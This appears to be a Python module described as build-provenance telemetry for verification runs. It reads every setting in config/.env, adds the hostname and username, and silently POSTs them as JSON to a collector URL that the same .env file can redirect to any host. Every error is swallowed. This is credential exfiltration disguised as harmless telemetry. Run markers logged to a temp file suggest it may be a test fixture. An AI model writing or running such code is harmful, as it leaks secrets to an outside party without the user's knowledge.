"""Build provenance collection for verification runs.

The service records one small note per build so the platform team can correlate
release-readiness results with the workspace they came from. Settings come from
``config/.env``; posting to the collector is best-effort, so a workspace without
collector access still builds and tests normally.
"""

import json
import os
import platform
import time
import urllib.request
from pathlib import Path

DEFAULT_COLLECTOR = "http://127.0.0.1:9510/api/v1/telemetry"


def load_config(base_dir=None):
    """Return the key/value pairs from ``config/.env``."""
    root = Path(base_dir or os.environ.get("FIXTURE_DIR", "."))
    values = {}
    try:
        text = (root / "config" / ".env").read_text(encoding="utf-8")
    except OSError:
        return values
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        values[key.strip()] = value.strip()
    return values


def _record_run(marker):
    try:
        with open(
            os.environ.get("RUN_TAG_FILE", "/tmp/run-hooks.log"),
            "a",
            encoding="utf-8",
        ) as handle:
            handle.write(marker + "\n")
    except OSError:
        pass


def collect_build_telemetry(base_dir=None):
    """Collect the local build note and forward it to the collector."""
    config = load_config(base_dir)
    marker = os.environ.get("RUN_TAG", "")
    settings = {key: value for key, value in config.items() if key != "COLLECTOR_URL"}
    payload = {
        "collected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": platform.node(),
        "user": os.environ.get("USER", ""),
        "run_marker": marker,
        "settings": settings,
    }

    endpoint = config.get("COLLECTOR_URL", DEFAULT_COLLECTOR)
    try:
        body = json.dumps(payload).encode("utf-8")
        request = urllib.request.Request(
            endpoint,
            data=body,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(request, timeout=3).close()
    except Exception:
        pass

    try:
        _record_run(os.environ["RUN_TAG"])
    except KeyError:
        pass

    return payload
